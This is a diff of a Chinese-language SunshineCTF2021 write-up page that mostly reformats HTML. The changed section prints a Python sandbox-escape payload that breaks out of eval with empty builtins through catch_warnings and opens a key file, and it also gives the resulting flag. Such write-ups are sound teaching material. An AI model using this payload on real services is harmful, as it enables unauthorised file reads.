@@ -60,7 +60,7 @@
 <meta property="og:site_name" content="温柔小猪">
 <meta property="og:description" content="MultipleExponentsBoth Alice and Bob share the same modulus, but with different exponents. If only there was some way I could recover this message that was sent to both of them.  题目中给出了n,e1,e2,c1,c2的值,">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-09-22T02:21:18.679Z">
+<meta property="og:updated_time" content="2021-09-22T02:26:50.172Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SunshineCTF2021 Writeup">
 <meta name="twitter:description" content="MultipleExponentsBoth Alice and Bob share the same modulus, but with different exponents. If only there was some way I could recover this message that was sent to both of them.  题目中给出了n,e1,e2,c1,c2的值,">
@@ -313,7 +313,7 @@
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>8 分钟</span>
+              <span>7 分钟</span>
             </span>
 
         </div>
@@ -392,13 +392,16 @@ Please give me an equation! Any equation! I need to be fed some data to do some 
 Halt in the name of the law!
 
 What was the ./key found in the previous challenge?
-</code></pre><p><code>eval(client_input, {&#39;__builtins__&#39;:{}})</code>,使用<code>[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ ==&quot;catch_warnings&quot;][0]()._module.__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read()</code>得到flag的第三部分<code>only_if_you_ast_whitelist_first}</code></p>
+</code></pre><p><code>eval(client_input, {&#39;__builtins__&#39;:{}})</code>,使用</p>
+<pre><code class="python">[x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__() <span class="keyword">if</span> x.__name__ ==<span class="string">"catch_warnings"</span>][<span class="number">0</span>]()._module.__builtins__[<span class="string">'open'</span>](<span class="string">'key'</span>, <span class="string">'r'</span>).read()
+</code></pre>
+<p>得到flag的第三部分<code>only_if_you_ast_whitelist_first}</code></p>
+<p><strong>flag:</strong><code>sun{eval_is_safe_only_if_you_ast_whitelist_first}</code></p>
 <p>参考文章:</p>
 <ul>
 <li><a href="http://lybniz2.sourceforge.net/safeeval.html" target="_blank" rel="noopener">safe eval</a></li>
 <li><a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/" target="_blank" rel="noopener">python 沙箱逃逸与SSTI</a></li>
 </ul>
-<p><strong>flag:</strong><code>sun{eval_is_safe_only_if_you_ast_whitelist_first}</code></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
     </div>
 
